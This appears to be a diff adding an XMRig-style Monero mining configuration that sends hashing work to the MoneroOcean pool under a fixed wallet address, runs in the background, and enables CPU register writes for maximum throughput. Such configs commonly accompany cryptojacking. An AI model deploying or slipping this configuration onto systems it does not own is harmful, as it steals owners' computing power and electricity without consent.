@@ -1,0 +1,45 @@
+{
+  "api": {
+    "id": null,
+    "worker-id": "e201"
+  },
+  "autosave": true,
+  "background": true,
+  "colors": true,
+  "randomx": {
+    "1gb-pages": true,
+    "rdmsr": true,
+    "wrmsr": true,
+    "numa": true,
+    "scratchpad_prefetch_mode": 1
+  },
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "hw-aes": null,
+    "priority": null,
+    "asm": true,
+    "asm-prefetch": true,
+    "rx": [
+      { "rx/0": true },
+      { "rx/1": true }
+    ]
+  },
+  "pools": [
+    {
+      "url": "gulf.moneroocean.stream:10128",
+      "user": "4576JTdTYFp6hi2n2Ci54eSFzV8GSkNJTJVC1zswJpk7byZMSfu4W4mVpCsoQJHfSyQS6y5CkZ1kbZTTbUBbpFrYRgtzsrG",
+      "pass": "e201",
+      "keepalive": true,
+      "tls": false
+    }
+  ],
+  "donate-level": 1,
+  "log-file": null,
+  "pools-order": "round-robin",
+  "retries": 5,
+  "retry-pause": 5,
+  "syslog": false,
+  "user-agent": null,
+  "verbose": 0
+}
